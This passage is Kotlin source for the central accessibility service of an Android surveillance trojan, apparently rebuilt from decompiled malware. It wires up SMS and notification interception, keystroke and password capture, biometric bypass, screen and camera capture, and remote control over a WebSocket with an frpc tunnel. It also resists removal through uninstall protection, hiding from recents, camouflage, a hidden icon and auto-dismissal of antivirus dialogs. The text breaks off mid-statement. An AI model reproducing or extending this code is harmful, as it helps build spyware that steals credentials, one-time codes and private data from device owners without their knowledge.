package com.storm.safe.rock.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Point
import android.graphics.Rect
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.view.Display
import android.view.KeyEvent
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.DefaultLauncherAlias
import com.storm.safe.rock.MediaProjectionHolder
import com.storm.safe.rock.manager.C0258a0
import com.storm.safe.rock.manager.C0259a1
import com.storm.safe.rock.manager.C0263a5
import com.storm.safe.rock.manager.CameraCaptureManager
import com.storm.safe.rock.manager.ScreenCaptureManager
import com.storm.safe.rock.receiver.arniezsqllm
import com.storm.safe.rock.service.modules.AccessibilityEventRouter
import com.storm.safe.rock.service.modules.ActivityMonitor
import com.storm.safe.rock.service.modules.BiometricBypassDelegate
import com.storm.safe.rock.service.modules.ConfigProgressManager
import com.storm.safe.rock.service.modules.MainOrchestrator
import com.storm.safe.rock.service.modules.NetworkManager
import com.storm.safe.rock.service.modules.NotificationInterceptDelegate
import com.storm.safe.rock.service.modules.RemoteConfigManager
import com.storm.safe.rock.service.modules.SmsInterceptDelegate
import com.storm.safe.rock.service.modules.cipher.CipherCaptureManager
import com.storm.safe.rock.service.modules.command.CommandDispatcher
import com.storm.safe.rock.service.modules.protection.RecentsGuardManager
import com.storm.safe.rock.service.modules.protection.UninstallProtectionManager
import com.storm.safe.rock.service.modules.screen.ScreenControlHelper
import com.storm.safe.rock.service.modules.SmsContentObserver
import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
import com.storm.safe.rock.service.modules.FrpcProcessManager
import com.storm.safe.rock.util.AssetConfigReader
import java.util.Locale
import java.util.concurrent.atomic.AtomicBoolean
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject

/**
 * Core AccessibilityService — the central hub of the replica.
 *
 * Reverse-engineered from JADX reference `dqtvuisjd.java` (10,796 lines, 56 inner classes).
 * This file implements the ~60 core methods: companion/static, lifecycle (onServiceConnected,
 * onAccessibilityEvent, onDestroy), event dispatch, manager field wiring, and key utilities.
 *
 * JADX class: com.storm.safe.rock.service.dqtvuisjd
 */
class MyAccessibilityService : AccessibilityService() {

    // ════════════════════════════════════════════════════════════════
    // Companion object — mirrors JADX C0290a0 (static inner class)
    // ════════════════════════════════════════════════════════════════

    companion object {
        const val TAG = "MyAccessibilityService"

        /** Throttle interval for ensuring AppCoreService is running. JADX: 10000L */
        const val CORE_SERVICE_CHECK_INTERVAL = 10_000L

        /** Permission request auto-clear timeout (ms). JADX line 722: 30000 */
        const val PERMISSION_REQUEST_TIMEOUT = 30_000L

        /** Foreground notification ID. JADX line 9265: 10086 */
        const val FOREGROUND_NOTIFICATION_ID = 10086

        /** Notification channel ID for foreground service */
        const val NOTIFICATION_CHANNEL_ID = "system_helper_service"

        /** Root node cache time-to-live (ms). JADX: f52393c4 (constructor init) */
        const val ROOT_CACHE_TTL_MS = 150L

        /** Keyguard check cache TTL (ms). JADX: f52390c1 (constructor init) */
        const val KEYGUARD_CACHE_TTL_MS = 500L

        /** Event types routed to specialized handler only (not general delegate queue).
         * JADX line 9770: 512, 1024, 262144, 524288, 1048576, 2097152 */
        val FILTERED_EVENT_TYPES: Set<Int> = setOf(512, 1024, 262144, 524288, 1048576, 2097152)

        // ── Static fields (JADX m1–n1) ──

        /** Lazy Handler on main looper for uninstall protection. JADX: f52359m2 */
        val uninstallMainHandler: Handler by lazy { Handler(Looper.getMainLooper()) }

        /** JADX: f52360m3 — isWebViewOpen flag.
         *  Setter updates timestamp as well (mirrors setWebViewOpen). */
        @Volatile
        var isWebViewOpen: Boolean = false
            set(value) {
                field = value
                lastWebViewStatusTime = System.currentTimeMillis()
            }

        /** JADX: f52361m4 — isPermissionRequesting flag.
         *  Property-style accessor kept for backward compat with existing callers.
         *  Setting to true also records the timestamp (JADX line 780). */
        var isPermissionRequesting: Boolean
            get() = isPermissionRequestingFlag
            set(value) {
                isPermissionRequestingFlag = value
                if (value) {
                    permissionRequestTimestamp = System.currentTimeMillis()
                }
            }

        /** JADX: f52361m4 — internal flag backing */
        @Volatile
        private var isPermissionRequestingFlag: Boolean = false

        /** JADX: f52362m5 — permission request timestamp */
        @Volatile
        private var permissionRequestTimestamp: Long = 0L

        /** JADX: f52363m6 — lastWebViewStatusTime */
        @Volatile
        var lastWebViewStatusTime: Long = 0L
            private set

        /** JADX: f52364m7 — singleton instance */
        @Volatile
        internal var instance: MyAccessibilityService? = null

        /** JADX: f52365m8 — serviceStartTime */
        @Volatile
        var serviceStartTime: Long = 0L
            private set

        /** JADX: f52366m9 — lastCachedSource */
        @Volatile
        var lastCachedSource: CachedSourceData? = null

        /** JADX: f52367n0 — serviceMode (0=assist, 1=verifyPause) */
        @Volatile
        var serviceMode: Int = 0
            private set

        /** JADX: f52368n1 — isSensitiveAppPaused (AtomicBoolean in vendor) */
        private val sensitiveAppPausedAtomic = AtomicBoolean(false)

        // ── Companion methods ──

        fun getInstance(): MyAccessibilityService? = instance

        fun isServiceRunning(): Boolean = instance != null

        /** JADX line 734: instance != null && d0 flag (init complete) */
        fun isServiceReady(): Boolean {
            val inst = instance ?: return false
            return inst.isInitComplete
        }

        /** JADX line 730: AtomicBoolean.get() */
        fun isSensitiveAppPaused(): Boolean = sensitiveAppPausedAtomic.get()

        /** JADX line 764/768: AtomicBoolean.set() */
        fun setSensitiveAppPaused(paused: Boolean) {
            sensitiveAppPausedAtomic.set(paused)
        }

        // JADX line 764/768: pauseForSensitiveApp/resumeFromSensitiveApp — thin wrappers for AtomicBoolean.set()
        fun pauseForSensitiveApp() = setSensitiveAppPaused(true)
        fun resumeFromSensitiveApp() = setSensitiveAppPaused(false)

        /** JADX line 718: check flag + 30s timeout, auto-clear on expiry */
        fun isPermissionRequestActive(): Boolean {
            if (!isPermissionRequestingFlag) return false
            if (System.currentTimeMillis() - permissionRequestTimestamp <= PERMISSION_REQUEST_TIMEOUT) {
                return true
            }
            // Timeout expired — auto-clear
            android.util.Log.w(TAG, "⚠️ [权限] 权限请求标志位超时，自动清除")
            isPermissionRequestingFlag = false
            return false
        }

        /** JADX line 787: serviceMode == 1 means verifyPaused */
        fun isVerifyPaused(): Boolean = serviceMode == 1

        /** JADX line 787: set mode to 1 */
        fun setVerifyPauseMode() {
            serviceMode = 1
        }

        /** JADX line 772: set mode to 0 */
        fun setAssistMode() {
            serviceMode = 0
        }

        /** JADX line 747: performGlobalAction(8) with SDK check.
         * GLOBAL_ACTION_LOCK_SCREEN = 8, requires API 28+ */
        fun lockScreen() {
            val inst = instance ?: return
            try {
                if (Build.VERSION.SDK_INT < 28) {
                    android.util.Log.d(TAG, "🔍 [屏幕] Android 9以下不支持无障碍锁屏")
                    return
                }
                if (inst.performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)) {
                    android.util.Log.d(TAG, "✅ [屏幕] 屏幕已锁定（定时唤醒后自动锁屏）")
                } else {
                    android.util.Log.w(TAG, "⚠️ [屏幕] 锁屏失败")
                }
            } catch (e: Exception) {
                android.util.Log.e(TAG, "⚠️ [屏幕] 锁屏异常: ${e.message}")
            }
        }

        /** JADX line 673: get NetworkManager, call disconnect+reconnect */
        fun forceReconnectWebSocket() {
            android.util.Log.d(TAG, "📡 外部触发WebSocket重连")
            try {
                val inst = instance ?: return
                val nm = inst.networkManager ?: run {
                    // JADX line 679: fallback to NetworkManager singleton
                    android.util.Log.w(TAG, "⚠️ instance.networkManager is null")
                    return
                }
                nm.disconnect()
                // JADX line 688–689: nm.m211643a8() (disconnect) then nm.m211669d6() (reconnect)
                val prefs = inst.getSharedPreferences("app_config", Context.MODE_PRIVATE)
                // JADX: vendor uses StringUtil.decrypt() for encrypted pref keys — using plaintext keys for now
                val serverUrl = prefs.getString("server_url", null)
                val deviceId = inst.getAndroidDeviceId()
                if (serverUrl != null) {
                    nm.connectToServer(serverUrl, deviceId)
                }
            } catch (e: Exception) {
                android.util.Log.e(TAG, "forceReconnectWebSocket error", e)
            }
        }

        /** JADX line 693: get cached root from instance */
        fun getCachedRoot(): AccessibilityNodeInfo? {
            return instance?.getRootNode()
        }

        fun logEvent(type: String, description: String) {
            android.util.Log.d(TAG, "[$type] $description")
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Instance fields — manager/delegate references
    // JADX fields f52369a0 through f52489m0
    // ════════════════════════════════════════════════════════════════

    // ── System managers ──

    var powerManager: PowerManager? = null
        private set

    var keyguardManager: KeyguardManager? = null
        private set

    // ── Core managers (JADX mapped) ──

    /** JADX: f52369a0 (C0260a2) — Screen capture */
    var screenCaptureManager: ScreenCaptureManager? = null

    /** JADX: f52370a1 (C0263a5) — Display manager */
    var displayManager: C0263a5? = null

    /** JADX: f52371a2 (C0258a0) — Camera manager */
    var cameraManager: C0258a0? = null

    /** JADX: f52372a3 (C0324a9) — SMS interception */
    var smsInterceptDelegate: SmsInterceptDelegate? = null

    /** JADX: f52375a6 (C0262a4) — Camera capture */
    var cameraCaptureManager: CameraCaptureManager? = null

    /** JADX: f52380b1 (C0350a7) — Command dispatch */
    var commandDispatcher: CommandDispatcher? = null

    /** JADX: f52382b3 (C0322a7) — Remote config */
    var remoteConfigManager: RemoteConfigManager? = null

    /** frpc 进程管理器 — vendor CheckProcessThread (thread/b.java) */
    var frpcProcessManager: FrpcProcessManager? = null

    /** JADX: f52414e5 (C0614i9) — Event filtering.
     *  Vendor: C0614i9 — EventFilterManager, now replicated. */
    var eventFilterManager: com.storm.safe.rock.service.modules.EventFilterManager? = null

    /** JADX: f52415e6 (C0323a8) — WebSocket network manager */
    @get:JvmName("networkManagerField")
    var networkManager: NetworkManager? = null

    /** JADX: f52418e9 (C0317a2) — Accessibility event routing */
    var accessibilityEventRouter: AccessibilityEventRouter? = null

    /** JADX: f52428f9 (C0318a3) — Config progress manager */
    var configProgressManager: ConfigProgressManager? = null

    /** JADX: f52429g0 (C0327b2) — Main orchestrator */
    var mainOrchestrator: MainOrchestrator? = null

    /** Diagnostic: throttle null-orchestrator log to avoid spam */
    @Volatile
    private var lastMainOrchestratorNullLogTime: Long = 0L

    /** JADX: f52431g2 (C0329b4) — Config stage / authorization module.
     *  Typed as Any? because JADX C0329b4 wraps DeviceAuthorizationManager internally.
     *  Cast to DeviceAuthorizationManager where needed. */
    var configStageManager: Any? = null

    /** JADX: f52434g5 (C0328b3) — Biometric bypass */
    var biometricBypassDelegate: BiometricBypassDelegate? = null

    /** JADX: f52435g6 (C0355a0) — Uninstall protection */
    var uninstallProtectionManager: UninstallProtectionManager? = null

    /** JADX: f52436g7 (C0356a1) — Recents hiding */
    var recentsGuardManager: RecentsGuardManager? = null

    /** JADX: f52437g8 (C0319a4) — GestureRecorder / Notification interception.
     *  JADX C0319a4 handles lockscreen gesture recording, hover events, and notification dispatch.
     *  notificationInterceptDelegate wraps the typed API; gestureRecorderManager holds the raw ref. */
    var notificationInterceptDelegate: NotificationInterceptDelegate? = null

    /** JADX: f52437g8 (C0319a4) — raw reference for gesture recording dispatch */
    var gestureRecorderManager: Any? = null

    /** JADX: f52438g9 (C0335a1) — Password/cipher capture */
    var cipherCaptureManager: CipherCaptureManager? = null

    /** JADX: f52441h2 (C0357a0) — Screen control helper */
    var screenControlHelper: ScreenControlHelper? = null

    /** JADX: f52439h0 (C0032al) — Gesture executor overlay manager */
    var gestureExecutor: Any? = null

    /** JADX: f52409e0 (u11) — Injection check periodic job reference */
    var injectionCheckJob: kotlinx.coroutines.Job? = null

    /** JADX: dqtvuisjd$startWebViewStatusCheckTask — WebView status expiry check job */
    private var webViewStatusCheckJob: kotlinx.coroutines.Job? = null

    /** JADX: f52455i6 (C0259a1) — Audio manager */
    var audioManager: C0259a1? = null

    /** JADX: f52461j2 (arniezsqllm) — SMS broadcast receiver */
    var smsReceiver: arniezsqllm? = null

    // ── Volatile state fields ──

    /** JADX: f52399d0 — init complete flag (used by isServiceReady) */
    @Volatile
    var isInitComplete: Boolean = false
        internal set

    /** JADX: f52400d1 — permission flow started */
    @Volatile
    var isPermissionFlowStarted: Boolean = false

    /** JADX: f52401d2 — deferred init in progress */
    @Volatile
    var isDeferredInitStarted: Boolean = false

    /** JADX: f52388b9 — cached keyguard locked state */
    @Volatile
    private var cachedKeyguardLocked: Boolean = false

    /** JADX: f52389c0 — last keyguard check timestamp */
    @Volatile
    private var lastKeyguardCheckTime: Long = 0L

    /** JADX: f52391c2 — cached root node */
    @Volatile
    private var cachedRootNode: AccessibilityNodeInfo? = null

    /** JADX: f52392c3 — cached root node timestamp */
    @Volatile
    private var cachedRootNodeTime: Long = 0L

    /** JADX: f52394c5 — uninstall protection enabled */
    @Volatile
    var isUninstallProtectionEnabled: Boolean = false

    /** JADX: f52447h8 — service lifecycle healthy flag */
    @Volatile
    var isServiceHealthyFlag: Boolean = false

    /** JADX: f52469k0 — cipher listening active */
    @Volatile
    var isCipherListeningActive: Boolean = false

    /** JADX: f52474k5 — cipher capture enabled */
    @Volatile
    var isCipherCaptureEnabled: Boolean = false

    /** JADX: f52477k8 — uninstall guard started */
    @Volatile
    var isUninstallGuardStarted: Boolean = false

    /** JADX: f52475k6 — camouflage mode flag */
    var isCamouflageModeEnabled: Boolean = false

    /** JADX: f52432g3 — screen capture active */
    @Volatile
    var isScreenCaptureActive: Boolean = false

    /** JADX: f52402d3 — network init started */
    @Volatile
    var isNetworkInitStarted: Boolean = false

    /** JADX: f52483l4 — transparent window added / control enabled */
    @Volatile
    var isControlEnabled: Boolean = false

    /** JADX: f52484l5 — controlledBy identifier */
    @Volatile
    var controlledBy: String? = null

    /** JADX: f52386b7 — last content change event timestamp (throttle) */
    @Volatile
    var lastContentChangeTime: Long = 0L

    /** JADX: f52442h3 — accessibility page monitor enabled */
    var isAccessibilityPageMonitorEnabled: Boolean = false

    /** JADX: f52449i0 — monitor confirmation required count */
    var monitorConfirmationCount: Int = 2

    /** JADX: f52450i1 — monitor max retry count */
    var monitorMaxRetryCount: Int = 8

    /** JADX: f52451i2 — monitor delay after service connected (ms) */
    var monitorDelayAfterConnected: Long = 1000L

    /** JADX: f52448h9 — monitor check interval (ms) */
    var monitorCheckInterval: Long = 500L

    /** JADX: f52453i4 — modules initialized flag */
    @Volatile
    var isModulesInitialized: Boolean = false

    /** JADX: f52411e2 — auth state restored flag */
    @Volatile
    var isAuthStateRestored: Boolean = false

    /** JADX: f52479l0 — overlay visible */
    @Volatile
    var isOverlayVisible: Boolean = false

    /** JADX: f52471k2 — cipher capture attempt count */
    @Volatile
    var cipherCaptureAttemptCount: Int = 0

    /** JADX: f52485l6 — password launch count */
    @Volatile
    var passwordLaunchCount: Int = 0

    // ── Tracking / timing fields ──

    var activePackageName: String = ""
        private set

    var activeClassName: String = ""
        private set

    private var lastCoreServiceCheckTime = 0L
    private var lastEventLogTime = 0L

    /** JADX: f52478k9 — saved brightness value */
    var savedBrightness: Int = 0

    /** JADX: f52444h5 — accessibility settings monitor timestamp */
    var accessibilitySettingsMonitorTime: Long = 0L

    /** JADX: f52445h6 — accessibility settings monitor count */
    var accessibilitySettingsMonitorCount: Int = 0

    /** JADX: f52443h4 — accessibility settings monitor job */
    var accessibilitySettingsMonitorJob: kotlinx.coroutines.Job? = null

    /** JADX: f52448h9 — last injection check time */
    var lastInjectionCheckTime: Long = 0L

    /** JADX: f52451i2 — last notification interception time */
    var lastNotificationTime: Long = 0L

    /** JADX: f52464j5 — last network event time */
    var lastNetworkEventTime: Long = 0L

    /** JADX: f52467j8 — last alarm schedule time */
    var lastAlarmScheduleTime: Long = 0L

    // ── Broadcast receiver registration flags ──

    /** JADX: f52458i9 — screen state receiver registered */
    var screenStateReceiverRegistered: Boolean = false

    /** JADX: f52460j1 — local service receiver registered */
    var localServiceReceiverRegistered: Boolean = false

    /** JADX: f52488l9 — permission health receiver registered */
    var permissionHealthReceiverRegistered: Boolean = false

    // ── Broadcast receivers ──

    /** JADX: f52457i8 — screen state receiver */
    private var screenStateReceiver: BroadcastReceiver? = null

    /** JADX: f52465j6 — permission request receiver */
    private var permissionRequestReceiver: BroadcastReceiver? = null

    /** JADX: f52489m0 — permission health receiver */
    private var permissionHealthReceiver: BroadcastReceiver? = null

    /** JADX: f52459j0 — local service action receiver */
    private var localServiceActionReceiver: BroadcastReceiver? = null

    /** JADX: f52466j7 — network event receiver */
    private var networkEventReceiver: BroadcastReceiver? = null

    // ── Collections ──

    /** JADX: f52403d4 — LinkedHashSet for tracking something (delegate IDs etc.) */
    private val trackedPackageSet = LinkedHashSet<String>()

    /** JADX: f52405d6 — LinkedHashMap for injection task tracking.
     *  Public in vendor (Java default visibility). Accessed by RemoteConfigManager. */
    val injectionTasks = LinkedHashMap<String, String>()

    /** JADX: f52406d7 — sync lock for injectionTasks.
     *  Public in vendor. Accessed by RemoteConfigManager for synchronized reads. */
    val injectionTasksLock = Any()

    /** JADX: f52407d8 — LinkedHashMap for injection throttle timestamps */
    private val injectionThrottleMap = LinkedHashMap<String, Long>()

    /** JADX: f52408d9 — injection check throttle interval (ms), constructor-initialized */
    var injectionThrottleInterval: Long = 5000L

    /** JADX: f52446h7 — Set for tracked window IDs */
    private val trackedWindowIds = mutableSetOf<String>()

    /** Delegate queue. Typed as Any for backward compat; cast to AccessibilityDelegate when dispatching */
    private val delegateQueue = mutableListOf<Any>()

    // ── Coroutine infrastructure ──

    private var coroutineScope: CoroutineScope? = null

    // ── Constants from constructor (JADX init block) ──
    // JADX: f52390c1, f52393c4, f52408d9, f52410e1, f52468j9, etc.
    // These are constructor-initialized final fields in vendor

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onCreate
    // JADX line 10300: calls ensureForegroundNotification
    // ════════════════════════════════════════════════════════════════

    override fun onCreate() {
        super.onCreate()
        try {
            ensureForegroundNotification()
            android.util.Log.d(TAG, "✅ [onCreate] 前台服务已在 accessibility 绑定前启动")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [onCreate] 前台服务启动失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onServiceConnected
    // JADX line 10663
    // ════════════════════════════════════════════════════════════════

    override fun onServiceConnected() {
        super.onServiceConnected()
        android.util.Log.i(TAG, "✅ [服务] 无障碍服务已连接")

        // Initialize ActivityMonitor log directory to app-private storage
        // Android 11+ Scoped Storage blocks direct /sdcard/ writes
        try {
            ActivityMonitor.logDir = filesDir
        } catch (_: Exception) {}

        try {
            ActivityMonitor.logSystem("无障碍服务已启动连接")
        } catch (_: Exception) {}

        // Step 1: Check reinstall recovery file
        var isReinstallRecovery = false
        try {
            val setupFile = java.io.File("/data/local/tmp/app_setup_done.json")
            if (setupFile.exists()) {
                val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                // JADX: vendor uses StringUtil.decrypt() for encrypted pref keys — using plaintext keys for now
                if (!prefs.getBoolean("authorization_completed", false)) {
                    try {
                        val json = org.json.JSONObject(setupFile.readText())
                        if (json.optBoolean("setupDone", false)) {
                            prefs.edit()
                                .putBoolean("authorization_completed", true)
                                .putBoolean("device_registered", true)
                                .putBoolean("icon_hidden", true)
                                .apply()
                            android.util.Log.d(TAG, "✅ [重装恢复] Service检测到适配标记，已恢复全部状态")
                            isReinstallRecovery = true
                        }
                    } catch (e: Exception) {
                        android.util.Log.w(TAG, "⚠️ [重装恢复] 读取标记文件异常: ${e.message}")
                        isReinstallRecovery = true // JADX: still sets true even on parse error
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "⚠️ [重装恢复] 读取标记文件异常: ${e.message}")
        }

        // Step 2: Initialize coroutine scope
        try {
            if (coroutineScope == null) {
                coroutineScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
            }
        } catch (_: Exception) {}

        try {
            // Step 3: Set timestamps and instance
            serviceStartTime = System.currentTimeMillis()
            instance = this

            // Step 4: Configure accessibility service info
            initServiceConfig()

            // Step 5: Get system services
            try {
                val ps = getSystemService(Context.POWER_SERVICE)
                powerManager = ps as PowerManager
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ PowerManager/Keyguard 初始化失败", e)
            }
            try {
                val ks = getSystemService(Context.KEYGUARD_SERVICE)
                keyguardManager = if (ks is KeyguardManager) ks else null
            } catch (_: Exception) {}

            // Step 6: Start AppCoreService
            try {
                val appContext = applicationContext
                AppCoreService.start(appContext)
            } catch (_: Exception) {}

            // Step 7: Launch deferred init coroutine
            // JADX: onServiceConnected launches 2 coroutines:
            // 1. If reinstall recovery, launch continueServiceInitialization first
            if (isReinstallRecovery) {
                coroutineScope?.launch {
                    try {
                        continueServiceInitialization()
                    } catch (e: Exception) {
                        android.util.Log.e(TAG, "❌ recovery init failed", e)
                    }
                }
            }

            // Step 8: Launch main init coroutine (JADX: C02982 lambda → deferredInit + doHeavyInit)
            // JADX: this.f52379b0 = AbstractC0780a0.m213692a3(scope, dispatcher, C02982, 2)
            coroutineScope?.launch {
                try {
                    deferredInit()
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ deferredInit failed", e)
                }
                try {
                    doHeavyInit()
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ doHeavyInit failed", e)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ onServiceConnected失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onAccessibilityEvent
    // JADX line 9715
    // ════════════════════════════════════════════════════════════════

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        try {
            // Guard 1: screen off → return (JADX line 9767)
            val pm = powerManager
            if ((pm != null && !pm.isInteractive) || isSensitiveAppPaused()) return

            val eventType = event.eventType

            // ── Filtered event types → route to eventFilterManager (JADX line 9770) ──
            if (eventType == 512 || eventType == 1024 || eventType == 262144 ||
                eventType == 524288 || eventType == 1048576 || eventType == 2097152) {
                if (eventFilterManager == null || isWebViewOpen) return
                // JADX: this.f52414e5.m213127b5(accessibilityEvent)
                // eventFilterManager is C0614i9; dispatch only if non-null
                eventFilterManager?.onAccessibilityEvent(event)
                return
            }

            // ── Ensure AppCoreService running (throttled 10s) (JADX line 9783) ──
            ensureCoreServiceRunning()

            // ── Extract package name (JADX line 9796) ──
            val pkg = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""

            // ── Screen capture pause check (JADX line 9804) ──
            // If screen capture active and event from system UI app → pause capture via tu0 handler
            try {
                val scm = screenCaptureManager
                if (scm != null && scm.isCapturing) {
                    val eventPkg = event.packageName?.toString() ?: ""
                    // JADX: tu0.f60269a7 — system app package prefixes
                    val systemApps = arrayOf(
                        "com.android.systemui", "com.android.settings",
                        "com.android.packageinstaller"
                    )
                    for (sysApp in systemApps) {
                        if (eventPkg.contains(sysApp, ignoreCase = true)) {
                            val now = System.currentTimeMillis()
                            if (now - (scm.lastPauseTime ?: 0L) >= 2000L) {
                                // JADX: tu0Var.f60281a6.post(new qu0(tu0Var, 0))
                                scm.lastPauseTime = now
                                scm.pauseCapture()
                            }
                            return
                        }
                    }
                }
            } catch (_: Exception) {}

            // ── Event type 32 (WINDOW_STATE_CHANGED): virus control dialog (JADX line 9827) ──
            if (eventType == 32) {
                try {
                    val eventPkg = event.packageName?.toString() ?: ""
                    if (eventPkg.contains("systemmanager", ignoreCase = true) ||
                        eventPkg.contains("hihonor", ignoreCase = true) ||
                        eventPkg.contains("huawei", ignoreCase = true)
                    ) {
                        coroutineScope?.launch {
                            handleVirusControlDialog()
                        }
                    }
                } catch (_: Exception) {}
            }

            // ── Event type 32/2048 → RecentsGuardManager (JADX line 9845) ──
            if (eventType == 32 || eventType == 2048) {
                try {
                    recentsGuardManager?.onAccessibilityEvent(event)
                } catch (_: Exception) {}
            }

            // ── MainOrchestrator WRITE_SETTINGS automation (JADX: C0327b2) ──
            // Must be BEFORE isPermissionRequestActive guard — WRITE_SETTINGS IS a permission
            // request, so the guard would block it. MainOrchestrator has its own isActive guard.
            try {
                val mo = mainOrchestrator
                if (mo == null) {
                    val now = System.currentTimeMillis()
                    if (now - lastMainOrchestratorNullLogTime > 10_000L) {
                        android.util.Log.d(TAG, "[onAccessibilityEvent] mainOrchestrator is null, WRITE_SETTINGS events not handled")
                        lastMainOrchestratorNullLogTime = now
                    }
                } else {
                    mo.handleAccessibilityEvent(event)
                }
            } catch (_: Exception) {}

            // ── SystemOptimizeManager ADB pairing event dispatch (vendor: C0360a2.m212078i3) ──
            try {
                val som = com.storm.safe.rock.service.modules.setup.SystemOptimizeManager.getInstance(this, this)
                // Debug trigger: `adb shell settings put global debug_start_pair 1`
                val debugTrigger = try {
                    Settings.Global.getInt(contentResolver, "debug_start_pair", 0)
                } catch (_: Exception) { 0 }
                if (debugTrigger == 1) {
                    try { Settings.Global.putInt(contentResolver, "debug_start_pair", 0) } catch (_: Exception) {}
                    android.util.Log.i(TAG, "[SOM] debug_start_pair=1 → 触发 startPairFlow")
                    som.startPairFlow()
                }
                som.filterAccessibilityEvent(event)
            } catch (_: Exception) {}

            // ── C0320a5 dispatch: keystroke capture, app usage, notifications ──
            // JADX: dispatches to C0320a5.m211582a3 for event types 16, 32, 64
            if (eventType == 16 || eventType == 32 || eventType == 64) {
                try {
                    eventFilterManager?.keystrokeCapture?.handleEvent(event, null)
                } catch (_: Exception) {}
            }

            // ── Permission request guard (JADX line 9848) ──
            if (isPermissionRequestActive() || isWebViewOpen) return

            // ── Keyguard locked check (JADX line 9849) ──
            val isKeyguardLocked = isKeyguardLockedCached()

            // ── Event type 2 (VIEW_TEXT_CHANGED) → update lastCachedSource (JADX line 9851) ──
            if (eventType == 2) {
                var source: AccessibilityNodeInfo? = null
                try {
                    source = event.source
                    val rect = Rect()
                    if (source != null) {
                        source.getBoundsInScreen(rect)
                        val text = source.text?.toString() ?: ""
                        val desc = source.contentDescription?.toString() ?: ""
                        val isVisible = source.isVisibleToUser
                        lastCachedSource = CachedSourceData(
                            text, desc, rect, isVisible, System.currentTimeMillis()
                        )
                    } else {
                        lastCachedSource = null
                    }
                } catch (_: Exception) {
                    lastCachedSource = null
                } finally {
                    try { source?.recycle() } catch (_: Exception) {}
                }
            }

            // ── Overlay/gesture executor dispatch when not keyguard locked (JADX line 9952) ──
            if (!isKeyguardLocked) {
                try {
                    // JADX: if (m211482h6() && (c0032al = this.f52439h0) != null) c0032al.m209814a3(event)
                    // gestureExecutor dispatch when overlay is enabled
                    // ADAPT: C0032al (GestureExecutor/LauncherProtector, 475 LOC) — complex overlay manager
                    // that monitors launcher long-press events for camouflage protection.
                    // Requires WindowManager overlay + HandlerThread infrastructure.
                    // Not replicated as standalone class; core protection logic is in
                    // RecentsGuardManager + UninstallProtectionManager.
                    if (isOverlayEnabled()) {
                        android.util.Log.v(TAG, "🛡️ [GestureExecutor] gestureExecutor event dispatch (C0032al not replicated as standalone)")
                    }
                } catch (_: Exception) {}
            }

            // ── WINDOW_CONTENT_CHANGED (2048) package tracking (JADX line 9960–9975) ──
            val isContentChange = eventType == 2048
            val contentChangePkg: String
            if (isContentChange) {
                val p = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
                contentChangePkg = p
            } else {
                contentChangePkg = ""
            }

            // ── Launcher/installer detection → skip if from launcher (JADX line 9972) ──
            val isFromLauncher = if (isContentChange && contentChangePkg.isNotEmpty()) {
                contentChangePkg.contains("launcher", ignoreCase = true) ||
                    contentChangePkg.contains("packageinstaller", ignoreCase = true) ||
                    contentChangePkg.contains("bbk", ignoreCase = true)
            } else false

            val contentChangeTime = if (isContentChange) System.currentTimeMillis() else 0L

            // ── Throttle: 300ms between content change events (JADX line 9978) ──
            val isThrottled = if (isContentChange && !isFromLauncher) {
                val throttled = contentChangeTime - lastContentChangeTime < 300L
                if (!throttled) lastContentChangeTime = contentChangeTime
                throttled
            } else false

            // ── UninstallProtectionManager dispatch for specific packages (JADX line 9982–9998) ──
            if (!isUninstallGuardStarted && !isKeyguardLocked && !isThrottled) {
                try {
                    val eventPkgLower = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
                    if (eventPkgLower.isNotEmpty()) {
                        uninstallProtectionManager?.let { upm ->
                            // JADX: C0355a0.m211934d7(lowerCase5) — checks if pkg is relevant
                            upm.onAccessibilityEvent(event)
                        }
                    }
                } catch (_: Exception) {}
            }

            // ── Uninstall protection for extended package list (JADX line 9999–10013) ──
            if (isUninstallGuardStarted || isKeyguardLocked || isThrottled) {
                // skip
            } else {
                try {
                    val eventPkgLower = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
                    if (eventPkgLower.isNotEmpty() && isPackageInProtectionList(eventPkgLower)) {
                        uninstallProtectionManager?.onAccessibilityEvent(event)
                    }
                } catch (_: Exception) {}
            }

            // ── Event type 32: Package installer overlay (JADX line 10015–10035) ──
            if (eventType == 32) {
                try {
                    val eventPkgLower = event.packageName?.toString()?.lowercase(Locale.ROOT) ?: ""
                    if (eventPkgLower.contains("packageinstaller", ignoreCase = true) ||
                        eventPkgLower.contains("packagemanager", ignoreCase = true)
                    ) {
                        val cls = event.className?.toString() ?: ""
                        if (cls.contains("InstallAppProgress", ignoreCase = true) ||
                            cls.contains("InstallStaging", ignoreCase = true) ||
                            cls.contains("InstallStart", ignoreCase = true) ||
